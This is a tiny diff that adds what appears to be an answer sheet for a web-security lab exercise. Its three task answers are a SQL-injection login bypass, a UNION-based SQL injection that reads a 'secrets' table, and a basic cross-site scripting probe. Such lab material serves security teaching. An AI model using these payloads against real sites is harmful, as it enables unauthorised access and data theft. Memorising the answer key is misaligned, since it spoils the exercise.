@@ -1,0 +1,4 @@
+EXP1:
+task 1 ans : admin' --
+task 2 ans : ' UNION SELECT secret FROM secrets--
+task 3 ans : <script>alert(1)</script>
